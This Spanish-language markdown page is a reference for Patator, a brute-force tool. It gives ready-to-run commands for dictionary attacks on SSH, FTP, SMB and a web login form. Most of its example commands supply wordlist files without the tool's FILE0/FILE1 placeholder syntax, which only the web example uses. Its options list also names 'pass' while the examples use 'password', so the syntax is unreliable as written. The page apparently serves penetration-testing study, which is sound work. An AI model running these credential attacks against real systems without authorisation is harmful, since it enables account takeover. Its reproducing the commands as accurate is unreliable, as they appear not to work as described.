### **Miscelánea/Ataques de Fuerza Bruta/Patator.md**

# Patator

## Descripción

`Patator` es una herramienta de fuerza bruta multi-protocolo y modular diseñada para realizar ataques de diccionario contra servicios como SSH, FTP, HTTP, SMB, y más. Es altamente configurable y permite automatizar intentos de autenticación para descubrir credenciales válidas.

## Uso

```bash
patator [módulo] [opciones]
```

### Módulos principales

- `ssh_login`: Ataques de fuerza bruta a servicios SSH.
- `ftp_login`: Ataques de fuerza bruta a servicios FTP.
- `http_fuzz`: Fuzzing y ataques a formularios web.
- `smb_login`: Ataques de fuerza bruta a servicios SMB.
- `rdp_login`: Ataques de fuerza bruta a servicios RDP.

### Opciones principales

- `host`: Dirección IP o hostname del objetivo.
- `user`: Archivo con nombres de usuarios.
- `pass`: Archivo con contraseñas.
- `threads`: Número de hilos para ejecutar en paralelo.
- `max_retries`: Número máximo de reintentos por host.
- `delay`: Retraso entre intentos.
- `log`: Archivo para registrar resultados.

## Ejemplos

- Ataque de fuerza bruta a SSH usando archivos de usuarios y contraseñas:
  
  ```bash
  patator ssh_login host=192.168.1.10 user=user.txt password=pass.txt -x ignore:mesg='Authentication failed.'
  ```

- Ataque de fuerza bruta a FTP con 10 hilos:
  
  ```bash
  patator ftp_login host=192.168.1.10 user=user.txt password=pass.txt threads=10 -x ignore:mesg='Login incorrect.'
  ```

- Fuzzing de formularios web para descubrir parámetros:
  
  ```bash
  patator http_fuzz url='http://ejemplo.com/login.php' method=POST body='usuario=FILE0&password=FILE1' 0=user.txt 1=pass.txt
  ```

- Ataque de fuerza bruta a SMB registrando las credenciales válidas:
  
  ```bash
  patator smb_login host=192.168.1.10 user=user.txt password=pass.txt -x ignore:mesg='STATUS_LOGON_FAILURE' -o resultados_validos.txt
  ```
